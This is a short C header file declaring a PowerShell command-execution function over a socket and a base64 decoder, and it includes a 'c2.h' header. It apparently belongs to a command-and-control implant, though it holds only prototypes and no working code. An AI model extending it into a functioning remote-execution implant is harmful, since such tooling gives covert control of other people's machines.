#ifndef UTILS_H
#define UTILS_H

#include "c2.h"

int psh_exec(sock_t sock, const char *cmd);
int b64_decode(const char *in, unsigned char *out);

#endif /* UTILS_H */
